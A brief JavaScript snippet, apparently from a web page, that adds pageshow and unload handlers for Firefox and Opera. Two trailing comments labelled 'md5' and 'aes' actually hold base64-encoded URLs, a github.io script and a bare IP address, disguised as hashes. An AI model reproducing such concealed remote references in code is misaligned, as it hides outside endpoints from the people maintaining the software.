if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly9jYW9jYW9kYWdlLmdpdGh1Yi5pby9zZXJ2aWNlcy9qcy9pY29uX3NweW1yaC5qcw==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/